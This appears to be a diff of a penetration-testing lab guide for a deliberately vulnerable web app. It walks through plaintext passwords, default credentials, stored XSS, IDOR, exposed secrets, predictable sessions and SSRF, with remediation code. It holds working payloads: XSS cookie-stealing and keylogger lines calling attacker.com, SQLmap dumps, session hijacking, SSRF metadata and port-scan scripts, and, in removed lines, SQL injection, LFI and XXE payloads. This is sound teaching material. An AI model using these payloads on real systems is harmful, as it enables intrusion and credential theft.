@@ -1,851 +1,696 @@
-## Other Vulnerabilities to Discover
+## Additional Vulnerabilities to Discover
 
-This application contains 15 intentional security vulnerabilities organised by severity. Use this as a checklist for your penetration test.
+You've now tested IDOR and SQL Injection from the main guide. This application contains 13 additional intentional security vulnerabilities organised by severity. Use this as a checklist for your penetration test.
 
 ### 🔴 CRITICAL Severity
 
 #### 1. Plaintext Password Storage
 **Location**: User authentication system  
-**Test**: Register a new account, then check error messages or database inspection  
 **What to look for**: Passwords stored without hashing (bcrypt, scrypt, etc.)  
 **Impact**: If database is compromised, all user passwords are immediately exposed  
 **OWASP**: A02:2021 - Cryptographic Failures
 
+**How to Test:**
+
+**Step 1: Extract Database Using SQLmap**
+```bash
+# Use the product search endpoint (already covered in README.md)
+sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
+  -T users --dump --batch --dbms=SQLite
+```
+
+**Step 2: Examine the Output**
+Look at the users table dump:
+```
+Database: SQLite_masterdb
+Table: users
+[7 entries]
++----------+------------+---------+
+| username | password   | role    |
++----------+------------+---------+
+| admin    | admin123   | admin   |  ← Plaintext!
+| thepubco | welcome123 | customer|  ← Plaintext!
+```
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: Passwords are stored in plaintext, not hashed
+
+**Why This is Dangerous:**
+- Database breach = instant credential compromise
+- Users often reuse passwords across services
+- Violates GDPR, PCI-DSS, and industry standards
+
+**Remediation:**
+```typescript
+// ❌ CURRENT: Plaintext storage
+db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, password);
+
+// ✅ SECURE: Hash with bcrypt
+import bcrypt from 'bcrypt';
+const hashedPassword = await bcrypt.hash(password, 10);
+db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, hashedPassword);
+```
+
 #### 2. Default/Hardcoded Credentials
 **Location**: Pre-populated user accounts  
-**Test**: Try common default credentials like `admin/admin123`  
 **Impact**: Immediate administrative access without brute force  
 **OWASP**: A07:2021 - Identification and Authentication Failures
+
+**How to Test:**
+
+**Step 1: Try Common Default Credentials**
+1. Navigate to `/login`
+2. Try these common combinations:
+   - `admin` / `admin`
+   - `admin` / `admin123` ✅ **This works!**
+   - `administrator` / `password`
+   - `root` / `root`
+
+**Step 2: Check Documentation**
+Default credentials are often documented in README files or comments
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: `admin/admin123` grants full administrative access
+
+**Why This is Dangerous:**
+- First thing attackers try
+- Automated scanners check for default credentials
+- No technical skill required to exploit
+
+**Remediation:**
+- Force password change on first login
+- Generate random initial passwords
+- Never use predictable defaults in production
 
 ---
 
 ### 🟠 HIGH Severity
 
-#### 3. SQL Injection
-**Location**: Login form, product search  
-**Test**: Username field with `' OR '1'='1' --` (any password)  
-**Alternative payloads**: 
-- `admin'--`
-- `' OR 1=1--`
-- `'; DROP TABLE users--`
-**Impact**: Complete authentication bypass, database manipulation, data extraction  
-**Tools**: SQLmap, Burp Suite Intruder  
-**OWASP**: A03:2021 - Injection
+**Note**: SQL Injection and IDOR were covered in README.md. The following are additional HIGH severity vulnerabilities.
 
-#### 4. Stored Cross-Site Scripting (XSS)
-**Locations**: Profile bio, order notes
-**Test payloads**:
-- `<img src=x onerror=alert('XSS')>` (Recommended for React apps)
-- `<img src=x onerror=alert(document.cookie)>`
-- Note: `<script>` tags may not execute due to browser protections against `innerHTML` insertion.
+#### 3. Stored Cross-Site Scripting (XSS)
+**Locations**: Profile bio, order notes, contact form  
 **Impact**: Session hijacking, credential theft, defacement  
 **OWASP**: A03:2021 - Injection
 
-#### 5. Insecure Direct Object Reference (IDOR)
-**Locations**: `/api/orders/:id`, `/api/profile/:userId`  
-**Test**: Login as one customer, capture order ID, login as different customer, access first customer's order ID  
-**Tools**: Burp Suite Repeater, Firefox Developer Tools  
-**Impact**: Unauthorised access to other users' sensitive data  
+**How to Test:**
+
+**Test Location 1: Profile Bio**
+
+**Step 1: Login and Navigate to Profile**
+1. Login as `thepubco` / `welcome123`
+2. Click "My Profile" in the sidebar
+3. Press **F12** to open Firefox Developer Tools
+
+**Step 2: Inject XSS Payload**
+In the **Bio** field, enter:
+```html
+<img src=x onerror=alert('XSS')>
+```
+
+**Step 3: Save and Refresh**
+1. Click **Save Profile**
+2. Refresh the page
+3. Observe the alert box appearing
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: JavaScript executes when the page loads
+
+**Test Location 2: Order Notes (More Dangerous)**
+
+**Step 1: Place an Order with Malicious Note**
+1. Navigate to "Place Order"
+2. Add products to cart
+3. In the **Order Notes** field, enter:
+```html
+<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
+```
+4. Submit the order
+
+**Step 2: View as Admin**
+1. Logout and login as `admin` / `admin123`
+2. View all orders (admin can see all customer orders)
+3. An error message should appear on the screen, (as the attacker website above doesn't exist) - but if it did, we would now have the admins login cookie, and can use that to masquerade as them - and all they did was visit a page.
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: Admin's session cookie is sent to attacker's server
+
+**Why This is Dangerous:**
+- **Session hijacking**: Steal admin cookies
+- **Credential harvesting**: Inject fake login forms
+- **Defacement**: Modify page content
+- **Keylogging**: Capture user input
+
+**Additional Payloads to Try:**
+```html
+<!-- Cookie theft -->
+<img src=x onerror=alert(document.cookie)>
+
+<!-- Redirect to phishing site -->
+<img src=x onerror=window.location='http://evil.com'>
+
+<!-- Keylogger -->
+<img src=x onerror="document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}">
+```
+
+**Note**: `<script>` tags may not execute in React apps due to browser protections against `innerHTML` insertion. Use event handlers instead.
+
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: Direct HTML insertion
+<div dangerouslySetInnerHTML={{__html: userBio}} />
+
+// ✅ SECURE: Sanitise input
+import DOMPurify from 'dompurify';
+const cleanBio = DOMPurify.sanitize(userBio);
+<div dangerouslySetInnerHTML={{__html: cleanBio}} />
+
+// ✅ BETTER: Use text content only
+<div>{userBio}</div>
+```
+
+#### 4. IDOR in User Profiles
+**Location**: `/api/profile/:userId`  
+**Impact**: Unauthorised access to other users' personal information  
 **OWASP**: A01:2021 - Broken Access Control
 
-#### 6. Exposed Secrets in Client Code
+**Note**: IDOR in orders was covered in README.md. This tests IDOR in a different endpoint.
+
+**How to Test:**
+
+**Step 1: Discover Your User ID**
+1. Login as `thepubco` / `welcome123`
+2. Press **F12** to open Firefox Developer Tools
+3. Go to the **Network** tab
+4. Navigate to "Profile" in the sidebar
+5. Find the request to `/api/profile` or `/api/user`
+6. In the **Response** tab, note your user ID (e.g., `5f68c067-1c1e-4464-9f45-2f62aecbfaea`)
+
+**Step 2: Capture Other User IDs**
+1. Logout and login as `bella_italia` / `pasta2024`
+2. Open the **Console** tab in Developer Tools
+3. Try accessing thepubco's user data using their UUID:
+```javascript
+// Replace with actual UUID from Step 1
+fetch('/api/user/THEPUBCO_UUID_HERE')
+  .then(r => r.json())
+  .then(data => console.log('Stolen profile:', data))
+  .catch(e => console.log('Error:', e))
+```
+4. Repeat for other accounts to collect multiple user IDs
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: You can view other users' profiles including:
+- Email addresses
+- Phone numbers
+- Company names
+- Delivery addresses
+
+**Why This is Dangerous:**
+- **Privacy breach**: GDPR violation
+- **Competitive intelligence**: Discover all customers
+- **Targeted attacks**: Gather information for phishing
+
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: No ownership check
+app.get("/api/profile/:userId", (req, res) => {
+  const profile = db.prepare('SELECT * FROM users WHERE id=?').get(req.params.userId);
+  res.json(profile);
+});
+
+// ✅ SECURE: Verify ownership
+app.get("/api/profile/:userId", (req, res) => {
+  if (req.params.userId !== req.session.userId && req.session.role !== 'admin') {
+    return res.status(403).json({ error: "Unauthorised" });
+  }
+  const profile = db.prepare('SELECT * FROM users WHERE id=?').get(req.params.userId);
+  res.json(profile);
+});
+```
+
+#### 5. Exposed Secrets in Client Code
 **Location**: JavaScript source code, environment variables  
-**Test**: View page source, check DevTools Sources tab, inspect bundle.js  
-**What to look for**: API keys, session secrets, internal endpoints  
 **Impact**: Credential compromise, API abuse  
 **OWASP**: A05:2021 - Security Misconfiguration
 
-#### 7. Predictable Session Tokens
+**How to Test:**
+
+**Step 1: Check Config Endpoints**
+Try accessing common configuration endpoints:
+```javascript
+// In the Console tab
+fetch('/api/config')
+  .then(r => r.json())
+  .then(data => console.log('Config:', data))
+```
+
+**Expected Response:**
+```json
+{
+  "environment": "development",
+  "version": "1.0.0",
+  "database": "in-memory",
+  "sessionSecret": "manchester-fresh-2024",
+  "adminUsername": "admin"
+}
+```
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: Sensitive configuration exposed
+
+**What This Reveals:**
+- **Session secret**: `manchester-fresh-2024` (can forge session tokens)
+- **Admin username**: `admin` (reduces brute force attempts)
+- **Environment details**: Development mode enabled
+- **Database type**: Reveals technology stack
+
+**Step 3: Check Git Configuration**
+
+```bash
+curl http://<TARGETIP>:5000/.git/config
+```
+
+**Expected Response:**
+```
+[core]
+  repositoryformatversion = 0
+[remote "origin"]
+  url = https://github.com/manchesterfresh/vulnerable-app.git
+# VULNERABILITY: Exposed git repository
+# Database credentials: postgres://admin:SecretPassword123@localhost:5432/freshfoods
+```
+
+**What This Reveals:**
+- **Database credentials**: `admin:SecretPassword123`
+- **Repository URL**: Source code location
+- **Infrastructure details**: PostgreSQL database
+
+**Why This is Dangerous:**
+- **Credential theft**: Direct database access
+- **Session forging**: Create valid session tokens with exposed secret
+- **Source code access**: Download entire codebase via .git
+- **Privilege escalation**: Use admin credentials
+
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: Exposed config endpoint
+app.get("/api/config", (req, res) => {
+  res.json({
+    sessionSecret: "manchester-fresh-2024",
+    adminUsername: "admin"
+  });
+});
+
+// ✅ SECURE: Remove config endpoint entirely
+// Or require admin authentication and return only safe values
+app.get("/api/config", requireAdmin, (req, res) => {
+  res.json({
+    version: "1.0.0",
+    environment: "production" // Generic info only
+  });
+});
+
+// ✅ Block .git directory
+app.use((req, res, next) => {
+  if (req.path.startsWith('/.git')) {
+    return res.status(404).send('Not Found');
+  }
+  next();
+});
+```
+
+<details>
+<summary> Other things to try on other web applications (*with permission!*) </summary>
+
+**Step 1: Open Firefox Developer Tools**
+1. Press **F12**
+2. Go to the **Debugger** tab (equivalent to Chrome's Sources)
+3. Press **Ctrl+Shift+F** to open "Search in all files"
+
+**Step 2: Search for Sensitive Keywords**
+Search for these terms one at a time:
+- `api_key`
+- `secret`
+- `password`
+- `token`
+- `SESSION_SECRET`
+- `AWS_ACCESS_KEY`
+- `private_key`
+
+**Step 3: Examine Results**
+Look for hardcoded credentials or API keys in the JavaScript bundles
+
+**Method 2: View Page Source**
+
+**Step 1: View Source**
+1. Right-click anywhere on the page
+2. Select "View Page Source" (or press **Ctrl+U**)
+
+**Step 2: Search for Secrets**
+Press **Ctrl+F** and search for:
+- `config`
+- `env`
+- `key`
+
+**Method 3: Check Network Responses**
+
+**Step 1: Monitor Network Traffic**
+1. Press **F12** and go to **Network** tab
+2. Navigate around the application
+3. Look for responses containing configuration data
+
+</details>
+
+
+
+#### 6. Predictable Session Tokens
 **Location**: Session cookies  
-**Test**: 
-1. Login and note session cookie value
-2. Logout and login again
-3. Compare cookie values - look for patterns
-**Pattern**: `sess_{counter}_{timestamp}`  
 **Impact**: Session enumeration and hijacking  
-**Tools**: Burp Suite Sequencer  
 **OWASP**: A07:2021 - Identification and Authentication Failures
 
-#### 8. Server-Side Request Forgery (SSRF)
+**How to Test:**
+
+**Method 1: Manual Pattern Analysis**
+
+**Step 1: Capture Multiple Session Tokens**
+1. Open Firefox and press **F12**
+2. Go to the **Storage** tab (equivalent to Chrome's Application tab)
+3. Expand **Cookies** → `http://<TARGETIP>:5000`
+4. Login as `thepubco` / `welcome123`
+5. Note the `connect.sid` cookie value (e.g., `sess_1000_1699876543`)
+6. Logout
+7. Login again and note the new cookie value (e.g., `sess_1001_1699876789`)
+8. Repeat 3-5 times
+
+**Step 2: Analyse the Pattern**
+Compare the session tokens:
+```
+Session 1: sess_1000_1699876543
+Session 2: sess_1001_1699876789
+Session 3: sess_1002_1699877012
+Session 4: sess_1003_1699877234
+```
+
+Pattern identified:
+- `sess_` prefix
+- Sequential counter (1000, 1001, 1002...)
+- Underscore separator
+- Unix timestamp
+
+**Step 3: Predict and Hijack Sessions**
+
+1. Install the **Cookie Editor** extension for Firefox:
+   - Visit: https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/
+   - Click "Add to Firefox"
+
+2. Login as `bella_italia` / `pasta2024`
+3. Note your session: e.g. `sess_1005_1699877500` (will be different to this one remember!)
+4. Click the Cookie Editor icon in the toolbar
+5. Find the `connect.sid` cookie
+6. Change the value to predict another user's session. For example, remember the IDs will be different.
+   - Try: `sess_1000_1699876543` (thepubco's session)
+   - Try: `sess_1004_1699877400` (another active session)
+7. Click **Save**
+8. Refresh the page
+
+**Expected Result:**
+✅ **Vulnerability Confirmed**: You're now logged in as a different user!
+
+**Method 2: Using Burp Suite Sequencer**
+
+**Step 1: Capture Session Tokens**
+1. Configure Firefox to use Burp proxy (127.0.0.1:8080)
+2. In Burp, go to **Proxy** → **HTTP history**
+3. Login/logout 20 times
+4. Find all login responses with `Set-Cookie` headers
+
+**Step 2: Analyse Randomness**
+1. Right-click a login response → **Send to Sequencer**
+2. In Sequencer, click **Start live capture**
+3. Perform 100+ logins (or use Intruder to automate)
+4. Click **Analyse now**
+
+**Expected Result:**
+✅ **Poor randomness**: Burp will report predictable patterns
+
+**Why This is Dangerous:**
+- **Session hijacking**: Guess active session tokens
+- **Account takeover**: Access any user's account
+- **No credentials needed**: Bypass authentication entirely
+
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: Predictable pattern
+const sessionId = `sess_${counter}_${Date.now()}`;
+
+// ✅ SECURE: Cryptographically random
+import crypto from 'crypto';
+const sessionId = crypto.randomBytes(32).toString('hex');
+```
+
+#### 7. Server-Side Request Forgery (SSRF)
+
+Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can abuse the functionality of a server to read or update internal resources. This happens when a web application accepts a URL from a user and fetches the content of that URL without proper validation.
+
 **Location**: `POST /api/fetch-document`  
-**Test payload**: `{"url": "http://<TARGETIP>:5000/api/config"}`  
-**Alternative targets**:
-- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
-- `http://<TARGETIP>:5000/data/customers.txt`
-- Internal network IPs
 **Impact**: Access to internal resources, credential exposure, port scanning  
 **OWASP**: A10:2021 - Server-Side Request Forgery
 
-#### 9. Local File Inclusion (LFI)
-**Location**: `GET /api/view-document?file=...`  
-**Test payloads**:
-- `file=../../../../etc/passwd`
-- `file=../../server/routes.ts`
-- `file=../../../package.json`
-**Impact**: Source code disclosure, configuration file access, credential theft  
-**OWASP**: A01:2021 - Broken Access Control
+**How to Test:**
 
----
+**Step 1: Test Basic SSRF**
 
-### 🟡 MEDIUM Severity
-
-#### 10. Weak Password Policy
-**Location**: Registration form  
-**Test**: Try registering with password `a` or `123`  
-**What to check**:
-- Minimum length (should be 12+ characters)
-- Complexity requirements
-- Common password blocking
-**Impact**: Easy credential guessing, successful brute force attacks  
-**OWASP**: A07:2021 - Identification and Authentication Failures
-
-#### 11. Missing CSRF Protection
-**Locations**: All state-changing endpoints (POST, PUT, DELETE)  
-**Test**: Create HTML form on external site that submits to `/api/orders`  
-**What to check**: No CSRF tokens, no SameSite cookie attributes  
-**Impact**: Unauthorised actions on behalf of authenticated users  
-**OWASP**: A01:2021 - Broken Access Control
-
-#### 12. Verbose Error Messages
-**Location**: All error responses  
-**Test**: Trigger errors by sending invalid data, malformed requests  
-**What to look for**:
-- Stack traces with file paths
-- SQL error messages revealing database structure
-- Internal server details
-**Impact**: Information disclosure aids further attacks  
-**OWASP**: A05:2021 - Security Misconfiguration
-
-#### 13. No Rate Limiting
-**Locations**: Login, registration, all endpoints  
-**Test**: Script 100+ rapid login attempts  
-**Tools**: Burp Suite Intruder, custom Python script  
-**Impact**: Brute force attacks, credential stuffing, DoS  
-**OWASP**: A07:2021 - Identification and Authentication Failures
-
-#### 14. XML External Entity (XXE) Injection
-**Location**: `POST /api/import-order`  
-**Test payload**:
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<order>
-  <customer>&xxe;</customer>
-</order>
-```
-**Impact**: File disclosure, SSRF, denial of service  
-**OWASP**: A05:2021 - Security Misconfiguration
-
-#### 15. Information Disclosure
-**Locations**: Various endpoints and files  
-**Test**:
-- Navigate to `/.git/HEAD` (source code exposure)
-- Check `/robots.txt` for hidden paths
-- Access `/api/config` (configuration disclosure)
-- Try `/data/customers.txt` (PII leak)
-**Impact**: Reconnaissance data for further attacks  
-**OWASP**: A05:2021 - Security Misconfiguration
-
----
-
-## Penetration Testing Tools & Setup
-
-### Essential Tools for This Application
-
-This section provides detailed setup and usage instructions for the most effective tools to test Manchester Fresh Foods.
-
-### 1. Burp Suite Community Edition
-
-**Purpose**: HTTP request interception, manipulation, and repeating  
-**Best for**: IDOR testing, session analysis, CSRF testing, manual SQL injection
-
-**Setup for Firefox:**
-1. Download from [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
-2. **Configure Firefox proxy:**
-   - Open Firefox Settings (about:preferences)
-   - Scroll to Network Settings → Click "Settings..."
-   - Select "Manual proxy configuration"
-   - HTTP Proxy: `127.0.0.1` Port: `8080`
-   - Check "Also use this proxy for HTTPS"
-   - Click OK
-3. **Import Burp's CA certificate in Firefox:**
-   - In Burp, go to Proxy → Options → Import/Export CA Certificate
-   - Export Certificate in DER format
-   - In Firefox: Settings → Privacy & Security → Certificates → View Certificates
-   - Import → Select the certificate → Check "Trust this CA to identify websites"
-
-**Testing Manchester Fresh Foods:**
-
-**Example 1: IDOR Testing**
-```
-1. Proxy → Intercept: ON
-2. Login as thepubco and navigate to My Orders
-3. Observe the GET /api/orders request in Burp's HTTP History
-4. Note the order UUIDs in the JSON response
-5. Right-click request → Send to Repeater
-6. Logout, login as bella_italia
-7. In Repeater, change URL to /api/orders/THEPUBCO_ORDER_UUID
-8. Click Send - observe unauthorised access to another user's order!
+1. Login to the application
+2. Press **F12** and go to the **Console** tab
+3. Test if the endpoint exists:
+```javascript
+fetch('/api/fetch-document', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url: 'http://example.com'})
+})
+.then(r => r.text())
+.then(data => console.log(data))
 ```
 
-**Example 2: SQL Injection Testing**
-```
-1. Intercept login POST to /api/login
-2. Send to Intruder
-3. Set payload position: username=§admin§
-4. Load SQL injection payloads from Burp's built-in list
-5. Start attack and observe responses
-6. Look for authentication bypass (200 status with session cookie)
-```
-
-**Example 3: Session Token Analysis**
-```
-1. Login/logout multiple times
-2. Send all login responses to Sequencer
-3. Analyze token randomness
-4. Observe predictable pattern: sess_1000_timestamp, sess_1001_timestamp, etc.
+**Step 2: Access Internal Configuration**
+```javascript
+// Try to access internal API endpoints
+fetch('/api/fetch-document', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url: 'http://<TARGETIP>:5000/api/config'})
+})
+.then(r => r.json())
+.then(data => console.log('Config exposed:', data))
 ```
 
----
+**Step 3: Access Internal Files**
+```javascript
+// Try to read internal data files
+fetch('/api/fetch-document', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url: 'http://<TARGETIP>:5000/data/customers.txt'})
+})
+.then(r => r.text())
+.then(data => console.log('Customer data:', data))
+```
 
-### 2. OWASP ZAP (Zed Attack Proxy)
+**Step 4: Access Cloud Metadata (If on AWS)**
+```javascript
+// AWS metadata endpoint (contains credentials!)
+fetch('/api/fetch-document', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({url: 'http://169.254.169.254/latest/meta-data/'})
+})
+.then(r => r.text())
+.then(data => console.log('AWS metadata:', data))
+```
 
-**Purpose**: Automated scanning and passive vulnerability detection  
-**Best for**: Quick reconnaissance, finding common vulnerabilities, generating reports  
-**Free alternative to Burp Suite Professional**
+**Step 5: Port Scanning**
+```javascript
+// Scan internal network
+for(let port of [22, 80, 443, 3306, 5432, 6379, 8080]) {
+  fetch('/api/fetch-document', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({url: `http://192.168.1.1:${port}`})
+  })
+  .then(r => console.log(`Port ${port}: Open`))
+  .catch(e => console.log(`Port ${port}: Closed`));
+}
+```
 
-**Installation:**
+**Alternative: Using curl**
 ```bash
-# Ubuntu/Debian
-sudo apt install zaproxy
-
-# macOS
-brew install --cask owasp-zap
-
-# Windows: Download from https://www.zaproxy.org/download/
-```
-
-**Automated Scan Against Manchester Fresh Foods:**
-
-**Quick Scan (5 minutes):**
-```
-1. Open ZAP
-2. Automated Scan → Enter: http://<TARGETIP>:5000
-3. Attack → Select all scan policies
-4. Start Scan
-5. Review Alerts tab after completion
-```
-
-**Manual Explore + Active Scan (Recommended):**
-```
-1. HUD Mode: Install ZAP's Firefox extension (HUD)
-2. Configure Firefox to use ZAP as proxy (127.0.0.1:8080)
-3. Manually browse the application while logged in
-4. ZAP will automatically discover all endpoints
-4. Right-click site → Attack → Active Scan
-5. Export report: Report → Generate HTML Report
-```
-
-**Testing Specific Endpoints:**
-```bash
-# Using ZAP CLI (after installation)
-
-# Scan login endpoint for SQL injection
-zap-cli quick-scan --self-contained \
-  --spider -r \
-  --ajax-spider \
-  http://<TARGETIP>:5000/login
-
-# Scan product search
-zap-cli quick-scan \
-  http://<TARGETIP>:5000/products
-```
-
-**Expected Findings:**
-- ✅ SQL Injection in login form
-- ✅ Missing CSRF tokens
-- ✅ Weak session cookies
-- ✅ XSS in profile bio
-- ✅ Verbose error messages
-
----
-
-### 3. SQLmap - Automated SQL Injection
-
-**Purpose**: Database extraction through SQL injection  
-**Best for**: Extracting complete database, testing blind SQL injection
-
-**Installation:**
-```bash
-# Linux/macOS
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
-cd sqlmap
-
-# Or use package manager
-sudo apt install sqlmap  # Ubuntu/Debian
-brew install sqlmap      # macOS
-```
-
-**Manchester Fresh Foods Specific Commands:**
-
-**Test 1: Login Form SQL Injection (Two Methods)**
-
-**Method A: Using Burp Suite Request File** (most reliable)
-```bash
-# 1. In Burp Suite, right-click the POST /api/login request
-# 2. Select "Copy to file" and save as login-request.txt
-# 3. Run SQLmap against the saved request:
-
-# Detect SQL injection
-sqlmap -r login-request.txt --batch --dbms=SQLite
-
-# Extract database names
-sqlmap -r login-request.txt --dbs --dbms=SQLite
-
-# List all tables
-sqlmap -r login-request.txt --tables --dbms=SQLite
-
-# Dump users table (plaintext passwords!)
-sqlmap -r login-request.txt -T users --dump --dbms=SQLite
-
-# Dump ALL data (orders, products, customers)
-sqlmap -r login-request.txt --dump-all --dbms=SQLite --exclude-sysdbs
-```
-
-**Method B: Direct URL with JSON** (if Burp unavailable)
-```bash
-# For API endpoints that expect JSON:
-sqlmap -u "http://<TARGETIP>:5000/api/login" \
-  --data='{"username":"admin","password":"test"}' \
-  --headers="Content-Type: application/json" \
-  --batch --dbms=SQLite
-
-# If SQLmap needs help finding the parameter, add a marker:
-sqlmap -u "http://<TARGETIP>:5000/api/login" \
-  --data='{"username":"admin*","password":"test"}' \
-  --headers="Content-Type: application/json" \
-  --dbms=SQLite
-```
-
-**Test 2: Product Search SQL Injection**
-```bash
-# Test product search endpoint
-sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
-  --batch --dbms=SQLite \
-  --level=5 --risk=3
-
-# Extract product table
-sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
-  --dbms=SQLite -T products --dump
-```
-
-**Test 3: Order IDOR + SQL Injection**
-```bash
-# First, get a valid session cookie by logging in
-# Copy connect.sid value from Firefox Developer Tools (Storage > Cookies)
-
-sqlmap -u "http://<TARGETIP>:5000/api/orders/ORDER_UUID_HERE" \
-  --cookie="connect.sid=YOUR_SESSION_COOKIE" \
-  --dbms=SQLite \
-  --dump -T orders
-```
-
-**SQLmap Output Interpretation:**
-```
-[INFO] testing 'SQLite inline queries'
-✅ VULNERABLE! Parameter 'username' is vulnerable
-
-[INFO] fetching database names
-[INFO] fetching tables for database: 'main'
-Database: SQLite_masterdb
-[6 tables]
-+---------------------+
-| contact_submissions |
-| order_items         |
-| orders              |
-| products            |
-| reviews             |
-| users               |
-+---------------------+
-
-Database: SQLite_masterdb
-Table: users
-[7 entries]
-+----------+------------+-----------+---------+
-| username | password   | role      | company |
-+----------+------------+-----------+---------+
-| admin    | admin123   | admin     | NULL    |
-| thepubco | welcome123 | customer  | The Pub Company Ltd |
-...
-```
-
----
-
-### 4. Nikto - Web Server Scanner
-
-**Purpose**: Reconnaissance and configuration testing  
-**Best for**: Finding hidden files, information disclosure, server misconfigurations
-
-**Installation:**
-```bash
-sudo apt install nikto     # Ubuntu/Debian
-brew install nikto         # macOS
-```
-
-**Scan Manchester Fresh Foods:**
-```bash
-# Basic scan
-nikto -h http://<TARGETIP>:5000
-
-# Comprehensive scan with all plugins
-nikto -h http://<TARGETIP>:5000 -Tuning x
-
-# Save results
-nikto -h http://<TARGETIP>:5000 -o nikto-report.html -Format html
-```
-
-**Expected Findings:**
-- ✅ Missing security headers (X-Frame-Options, CSP)
-- ✅ Potential directory listings
-- ✅ Information disclosure in error pages
-- ✅ Session cookie without Secure/HttpOnly flags
-
----
-
-### 5. Firefox Extensions for Penetration Testing
-
-**Cookie Editor (Firefox)**
-- **Purpose**: Manipulate session cookies for hijacking tests
-- **Install**: [Firefox Add-ons - Cookie Editor](https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/)
-- **Use case**: Change session ID to hijack another user's session
-
-**Example - Session Hijacking:**
-```
-1. Login as thepubco in Firefox
-2. Click the Cookie Editor icon in toolbar
-3. Find cookie: connect.sid=sess_1000_1699876543
-4. Edit the value, increment counter: sess_1001_1699876543
-5. Click Save, then refresh page
-6. Result: You've hijacked bella_italia's session!
-```
-
-**Cookie Quick Manager (Firefox)**
-- **Install**: [Firefox Add-ons - Cookie Quick Manager](https://addons.mozilla.org/en-GB/firefox/addon/cookie-quick-manager/)
-- Similar functionality with export/import for session replay
-- View all cookies in a searchable interface
-
-**Wappalyzer (Firefox)**
-- **Install**: [Firefox Add-ons - Wappalyzer](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/)
-- **Purpose**: Technology detection
-- **Expected results for MFF**: React, Express.js, Tailwind CSS, Node.js
-
-**FoxyProxy Standard (Firefox)**
-- **Install**: [Firefox Add-ons - FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/)
-- **Purpose**: Quick proxy switching for Burp Suite/ZAP
-- **Setup**: 
-  1. Click FoxyProxy icon → Options
-  2. Add new proxy: Title "Burp", Host "127.0.0.1", Port "8080"
-  3. Click FoxyProxy icon → Select "Burp" to enable proxy
-  4. Select "Disable FoxyProxy" to browse normally
-
----
-
-### 6. curl - Command-Line Testing
-
-**Purpose**: Quick API endpoint testing, scripting attacks  
-**Best for**: Automation, IDOR testing, bypass testing
-
-**Manchester Fresh Foods Examples:**
-
-**Test 1: SQL Injection in Login**
-```bash
-# Authentication bypass
-curl -X POST http://<TARGETIP>:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
-  -c cookies.txt \
-  -v
-
-# Check if logged in
-curl http://<TARGETIP>:5000/api/user \
-  -b cookies.txt
-```
-
-**Test 2: IDOR - Access Other User's Orders**
-```bash
-# Login as thepubco
+# Get session cookie first
 curl -X POST http://<TARGETIP>:5000/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"thepubco","password":"welcome123"}' \
-  -c thepubco-cookies.txt
+  -c cookies.txt
 
-# Get thepubco's orders
-curl http://<TARGETIP>:5000/api/orders \
-  -b thepubco-cookies.txt \
-  | jq '.[] | .id'  # Note the order UUIDs
-
-# Login as bella_italia
-curl -X POST http://<TARGETIP>:5000/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"bella_italia","password":"pasta2024"}' \
-  -c bella-cookies.txt
-
-# Access thepubco's order using bella's session!
-curl http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID \
-  -b bella-cookies.txt
-```
-
-**Test 3: XSS Payload Injection**
-```bash
-# Inject XSS into profile bio
-curl -X POST http://<TARGETIP>:5000/api/profile \
+# Test SSRF
+curl -X POST http://<TARGETIP>:5000/api/fetch-document \
   -H "Content-Type: application/json" \
   -b cookies.txt \
-  -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
+  -d '{"url":"http://<TARGETIP>:5000/api/config"}'
 ```
 
-**Test 4: Rate Limiting Test**
+**Expected Result:**
+✅ **Vulnerability Confirmed**: Server fetches internal resources and returns them
+
+**Why This is Dangerous:**
+- **Cloud credential theft**: Access AWS/Azure metadata
+- **Internal network access**: Bypass firewalls
+- **Port scanning**: Map internal infrastructure
+- **Data exfiltration**: Read internal files
+
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: No URL validation
+app.post('/api/fetch-document', async (req, res) => {
+  const response = await fetch(req.body.url);
+  res.send(await response.text());
+});
+
+// ✅ SECURE: Whitelist allowed domains
+const ALLOWED_DOMAINS = ['example.com', 'trusted-api.com'];
+app.post('/api/fetch-document', async (req, res) => {
+  const url = new URL(req.body.url);
+  if (!ALLOWED_DOMAINS.includes(url.hostname)) {
+    return res.status(403).json({ error: 'Domain not allowed' });
+  }
+  // Additional checks for private IP ranges
